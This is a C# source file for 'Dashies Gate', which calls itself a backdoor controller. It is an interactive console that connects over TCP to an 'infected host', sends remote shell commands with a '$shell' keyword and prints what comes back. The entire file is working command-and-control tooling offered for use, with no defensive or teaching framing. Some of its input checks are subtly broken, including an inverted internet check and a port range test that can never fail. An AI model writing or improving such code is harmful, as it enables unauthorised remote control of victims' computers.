

//Author: Dashie
//Version: 1.0


using System;
using System.Net;
using System.Text;
using System.Reflection;
using System.Diagnostics;
using System.Net.Sockets;
using System.Collections.Generic;
using System.IO;


/* ---[DASHIES GATE, MAIN NAMESPACE]--- */
namespace Dashies_Gate
{
    /* ---[MAIN PROGRAM CLASS]--- */
    class Program
    {
        /* ---[GLOBAL VARIABLES]--- */
        static byte[] stop_command = Encoding.ASCII.GetBytes("CLOSE GATE!");
        
        public static string local_address = (Helper.GetLocalIP());
        static string remote_host = (local_address);

        static int remote_port = (25565);

        /* ---[MAIN METHOD]--- */
        private static void Main()
        {
            reload_application:

            Console.WriteLine($"[#]: Welcome {Environment.UserName.ToUpper()} to the Dashie Backdoor Controller.");

            /* ---[ CONFIGURE THE HOST AND PORT ]--- */
            try
            {
                reconfigure_host:
                bool isNew = (true);

                if (isNew)
                {   
                    reconnect:
                    
                    if(Helper.isReachable("www.google.com", 53))
                    {
                        Console.WriteLine("[ERROR]: It seems like you have no usable internet connection right now.");
                        Console.Write("[PROMPT]: Do you believe this is our fault, perhaps try to reconnect (Y/n)? ");
                        
                        retype:

                        switch(Console.ReadLine().ToLower())
                        {
                            case "n": Environment.Exit(1); break;
                            case "y": goto reconnect;
                            
                            default: goto retype;
                        };
                    };

                    isNew = false;
                };

                Console.Write("(Dashies Gate/Host> ");
                remote_host = (Console.ReadLine().Replace(" ", ""));

                if (remote_host.Replace(" ", "") != string.Empty)
                {
                    if ((!IPAddress.TryParse(remote_host, out IPAddress ip_buff)) || (remote_host.Length < ($"1.1.1.1".Length)) || (remote_host.Length > ($"255.255.255.255".Length)))
                    {
                        Console.WriteLine("[ERROR]: Your host must consist out of a valid IPv4 Address!");
                        goto reconfigure_host;
                    };
                }

                else
                {
                    Console.WriteLine($"[INFO]: You left the remote host option empty, using {remote_host} now :D");
                };

                reconfigure_port:

                Console.Write("(Dashies Gate/Port> ");
                string port_buffer = Console.ReadLine();

                if ((Int32.TryParse(port_buffer, out remote_port)) && (remote_port > 65535) && (remote_port < 1))
                {
                    Console.WriteLine("[ERROR]: Your port must be convertable to an integer and must be in the range of 1 and 65535!");
                    goto reconfigure_port;
                };

                Console.WriteLine("[INFO]: Checking the by you given remote host its availability ....");

                if (!Helper.isReachable(remote_host, remote_port))
                {
                    Console.WriteLine("[ERROR]: The specified Remote Host seems to be unreachable!");
                    goto reconfigure_host;
                };
            }

            catch
            { };

            /* ---[ATTEMPT TO CONNECT AND CONTROL THE TARGET BY IP AND PORT]--- */
            try
            {
                Console.WriteLine($"[INFO]: Connecting to {remote_host}:{remote_port} ....");

                byte[] bytes = new byte[byte.MaxValue];
                Boolean newConnection = true;

                while (true)
                {
                    try
                    {
                        Socket long_socks = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IAsyncResult rem_connection_result = long_socks.BeginConnect(remote_host, remote_port, null, null);

                        Boolean isConnected = rem_connection_result.AsyncWaitHandle.WaitOne(500, true);

                        if (!isConnected)
                        {
                            Console.WriteLine($"[ERROR]: The host {remote_host}:{remote_port} has refused your connection!");
                            goto retype_decision;
                        };

                        if (newConnection)
                        {
                            newConnection = !newConnection;

                            Console.WriteLine($"[#]: You are now connected to {remote_host}:{remote_port} until you disconnect.");
                            Console.WriteLine($"[#]: Enter \'$disconnect\' without single quotation marks at any time to disconnect.");
                        };

                        retype_command:

                        Console.Write($"([{remote_host}:{remote_port}]> ");
                        string remote_command_full = Console.ReadLine();

                        if(remote_command_full.Split(' ').Length < 1)
                        {
                            goto retype_command;
                        };

                        string remote_command = remote_command_full.Split(' ')[0];
                        
                        if (remote_command == "$disconnect")
                        {
                            Console.Write($"[PROMPT]: You are about to terminate your current connection, are you sure you want to do this (Y/n)?");

                            retype_termination_decision:

                            switch (Console.ReadLine().ToLower())
                            {
                                default:
                                    goto retype_termination_decision;

                                case "n":
                                    continue;

                                case "y":
                                {
                                    Console.WriteLine($"[INFO]: Received the stop command, terminating the connection with {remote_host}:{remote_port} ....");

                                    long_socks.Send(stop_command);
                                    long_socks.Close();

                                    goto reload_application;
                                };
                            };
                        }

                        else
                        if (!Helper.isReachable(remote_host, remote_port))
                        {
                            Console.WriteLine($"[ERROR]: It seems like {remote_host}:{remote_port} has refused one of your connections, try again ;D");
                            continue;
                        }

                        else
                        if(remote_command == "$cd")
                        {
                            continue;
                        }

                        else
                        if(remote_command == "$shell")
                        {
                            if(remote_command_full.Length < 2)
                            {
                                Console.WriteLine($"[ERROR]: You must specify a command to send to the remote host!");
                                goto retype_command;
                            };

                            string parameters = string.Empty;

                            for(int id = 1; id < remote_command_full.Length; id += 1)
                            {
                                parameters += remote_command_full[id];
                            };

                            Console.WriteLine("[INFO]: Sending data to the remote host ....");
                            long_socks.Send(Encoding.ASCII.GetBytes($"{parameters}"));

                            Console.WriteLine("[INFO]: The command has been sent, awaiting response ....");
                            string response = Encoding.ASCII.GetString(bytes, 0, long_socks.Receive(bytes));

                            Console.WriteLine(response);
                        }

                        else
                        {
                            Console.WriteLine($"[ERROR]: The given command could not be found!");
                            continue;
                        };

                        /*
                        Console.WriteLine("[INFO]: Sending the by you specified command ....");
                        long_socks.Send(Encoding.ASCII.GetBytes($"{remote_command}"));

                        Console.WriteLine("[INFO]: The command has been sent, awaiting response ....");
                        string response = Encoding.ASCII.GetString(bytes, 0, long_socks.Receive(bytes));

                        Console.WriteLine($"new call_back_response[] = (((\r\n\r\n{response}\r\n\r\n)))");
                        */
                    }

                    catch
                    {
                        Console.WriteLine("[ERROR]: An error has occurred while being connected!");
                        break;
                    };
                };

                Console.WriteLine($"[INFO]: Thank you for using Dashies Gate, have a nice day :D");
            }

            catch
            { };

            /* ---[GIVE THE USER THE OPTION TO ACCESS ANOTHER INFECTED HOST]--- */
            retype_decision:
            
            try
            {
                Console.Write("[PROMPT]: Would you like to connect to another host (Y/n)? ");

                switch (Console.ReadLine().ToLower().ToCharArray()[0])
                {
                    case 'y':
                    {
                        Process.Start(Assembly.GetExecutingAssembly().Location);
                        Environment.Exit(0);
                        
                        break;
                    }

                    case 'n': Environment.Exit(0); break;
                    default: goto retype_decision;
                };
            }

            catch
            { };
        }
    }
};